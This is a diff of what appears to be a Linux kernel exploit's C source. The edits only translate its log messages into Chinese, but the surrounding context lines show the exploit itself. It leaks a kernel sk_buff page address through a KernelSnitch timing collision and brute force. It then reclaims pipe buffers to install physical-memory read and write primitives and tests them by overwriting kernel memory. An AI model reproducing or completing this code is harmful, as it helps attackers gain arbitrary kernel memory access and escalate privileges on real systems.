@@ -161,7 +161,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(waitpid(leak_child, NULL, 0));
 
   if (!kernelsnitch_collisions_ready()) {
-    pr_error("pipe KernelSnitch collision finding failed\n");
+    pr_error("pipe KernelSnitch冲突查找失败\n");
   }
 
   unsigned char *buf = malloc(SKB_SEND_SIZE);
@@ -211,7 +211,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_error("pipe KernelSnitch sk_buff页泄露失败\n");
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 
@@ -270,7 +270,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
   ssize_t got = read(result_pipe[0], &base, sizeof(base));
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+    pr_error("pipe页子进程未报告基址\n");
   }
   return base;
 }
@@ -627,7 +627,7 @@ int install_pipe_physrw(int fd) {
     return 0;
   }
   if (!pipe_reclaim_cache_gate(fd)) {
-    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
+    pr_info("物理内存缓存门失败 slab=%016zx 期望=%016zx\n",
             candidate_slab_cache, kmalloc_pipe_cache);
     return 0;
   }
@@ -639,7 +639,7 @@ int install_pipe_physrw(int fd) {
   }
 
   int found = find_pipe_buffer(fd, pipebuf_page_base);
-  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
+  pr_info("物理内存pipe探测 found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
           found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
           pipe_scan_ops, pipe_scan_len);
   if (!found) {
@@ -658,13 +658,13 @@ int install_pipe_physrw(int fd) {
   memset(physrw_readback, 0, sizeof(physrw_readback));
   physrw_read_ok =
     pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
-  pr_info("phys step probed read done ok=%d idx=%d\n",
+  pr_info("物理内存探测读取完成 ok=%d idx=%d\n",
           physrw_read_ok, pipebuf_pipe_idx);
 
   char overwrite[] = PHYS_WRITE_TAG;
   physrw_write_ok =
     pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
-  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
+  pr_info("物理内存探测写入完成 ok=%d\n", physrw_write_ok);
   kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));
 
   uintptr_t proof64_addr = proof_addr + 0x100;
@@ -673,7 +673,7 @@ int install_pipe_physrw(int fd) {
   kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
   physrw_read64_before = pipe_read64(fd, proof64_addr);
   physrw_read64_ok = physrw_read64_before == seed64;
-  pr_info("phys step read64 done ok=%d value=%016zx\n",
+  pr_info("物理内存read64完成 ok=%d value=%016zx\n",
           physrw_read64_ok, physrw_read64_before);
   physrw_write64_value = next64;
   physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
